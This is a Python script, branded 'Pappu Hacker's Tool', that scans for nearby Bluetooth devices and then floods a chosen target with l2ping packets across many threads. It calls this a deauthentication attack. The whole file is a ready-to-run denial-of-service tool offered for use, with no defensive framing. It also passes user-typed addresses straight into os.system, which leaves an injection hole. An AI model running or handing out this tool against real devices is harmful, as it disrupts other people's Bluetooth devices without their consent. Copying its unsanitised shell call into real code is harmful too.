
            
import os
import threading
import time
import subprocess

def scan_attack():
    hci = "sudo hciconfig hci0 up"
    subprocess.Popen(['gnome-terminal', '--geometry=100x30', '--', 'bash', '-c', hci])
    logo()
    while True:
        menu()
        choice = input("|-->Enter your choice (1 or 2) > ")
        if choice == '1':
            break
        elif choice == '2':
            attack()
            exit(0)
        else:
            print("Invalid choice! Please enter 1 or 2.")
    time.sleep(0.1)
    os.system('clear')
    print('')
    print("Scanning...")
    try:
        bluetooth_scan = subprocess.check_output("hcitool scan", shell=True, stderr=subprocess.STDOUT, text=True)
        lines = bluetooth_scan.splitlines()
        id = 1
        del lines[0]  # remove the header
        devices = []
        print("---------------------------------------------------------------")
        print("    ID   |        MAC Address        |       Device Name       ")
        print("---------------------------------------------------------------")
        for line in lines:
            info = line.split(maxsplit=2)
            if len(info) == 2:
                device_mac, device_name = info
            else:
                device_mac, device_name = info[0], " ".join(info[1:])
            devices.append((device_mac, device_name))
            print("    {}    |     {}     |  {}          ".format(id, device_mac, device_name))
            id += 1
            print("---------------------------------------------------------------")

        target_id = input('Target ID or MAC Address > ')
        try:
            target_address = devices[int(target_id) - 1][0]  # -1 because ID starts from 1
        except (IndexError, ValueError):
            target_address = target_id

        if not target_address:
            print('[!] Target address is missing!')
            exit(0)

        packet_size = int(input('Packet Size (Max : 600) > '))
        threads_count = int(input('Threads Count > '))
        print('')
        os.system('clear')

        for i in range(0, 3):
            countdown_message = f"[*] Starting deauthentication attack in {3 - i} seconds..."
            print(countdown_message, end='\r')
            time.sleep(1)
        os.system('clear')
        print('[*] Building threads...\n')

        for i in range(0, threads_count):
            print('[*] Built thread no:' + str(i + 1))
            threading.Thread(target=deauth, args=[str(target_address), str(packet_size)]).start()

        print('[*] All threads are ready!')
        print('[*] Started!')

    except subprocess.CalledProcessError:
        print("Error: Bluetooth device scanning failed.")
    except KeyboardInterrupt:
        print('\n[*] Aborted')
    except Exception as e:
        print('[!] ERROR: ' + str(e))
        exit(1)

def attack():
        target_address = input('Target ID or MAC Address > ')
        packet_size = int(input('Packet Size (Max : 600) > '))
        threads_count = int(input('Threads Count > '))
        print('')
        os.system('clear')

        for i in range(0, 3):
            countdown_message = f"[*] Starting deauthentication attack in {3 - i} seconds..."
            print(countdown_message, end='\r')
            time.sleep(1)
        os.system('clear')
        print('[*] Building threads...\n')

        for i in range(0, threads_count):
            print('[*] Built thread no:' + str(i + 1))
            threading.Thread(target=deauth, args=[str(target_address), str(packet_size)]).start()

        print('[*] All threads are ready!')
        print('[*] Started!')

def deauth(target_address, packet_size):
    os.system('l2ping -i hci0 -s ' + str(packet_size) + ' -f ' + target_address)

def menu():
    print('')
    print("+------------------+")
    print("|-Choose an option-|")
    print("+------------------+")
    print("|-->1. Scan and attack")
    print("|-->2. attack")

def logo():
    print("\t\t\t\t\t\t+-------------------------------+")
    print("\t\t\t\t\t\t|       Pappu Hacker's Tool     |")    
    print("\t\t\t\t\t\t|Bluetooth Deauthentication Tool|")
    print("\t\t\t\t\t\t+-------------------------------+")

if __name__ == '__main__':
    try:
        os.system('clear')
        scan_attack()
    except KeyboardInterrupt:
        time.sleep(0.1)
        print('\n[*] Aborted')
        exit(0)
    except Exception as e:
        time.sleep(0.1)
        print('[!] ERROR: ' + str(e))
            
            

